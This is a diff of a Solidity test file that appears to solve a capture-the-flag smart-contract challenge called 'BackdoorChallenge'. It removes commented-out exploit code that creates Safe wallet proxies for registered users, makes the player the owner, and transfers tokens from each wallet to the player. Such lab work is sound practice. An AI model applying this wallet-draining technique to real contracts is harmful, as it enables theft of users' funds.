@@ -80,16 +80,6 @@ contract BackdoorChallenge is Test {
         }
         Attacker attacker = new Attacker(walletFactory, singletonCopy, walletRegistry, users_copy, recovery, token);
         attacker.attack();
-        // bytes[] memory initializers = new bytes[](4);
-        // for (uint256 i = 0; i < 4; i++) {
-        //     address[] memory user = new address[](1);
-        //     user[0] = users[i]; 
-        //     initializers[i] = abi.encodeCall(Safe.setup, (user, 1, player, "", address(0), address(0), 0, payable(address(0))));
-        //     walletFactory.createProxyWithCallback(address(singletonCopy), initializers[i], i, walletRegistry);
-        //     bytes memory exec = abi.encodeCall(ModuleManager.execTransactionFromModule, (address(token), 0, abi.encodeCall(token.transfer, (player, 10)), Enum.Operation.Call));
-        //     (bool success,) = walletRegistry.wallets(users[i]).call(exec);
-        //     if (!success) {revert("failed");}
-        // }
     }
 
     /**
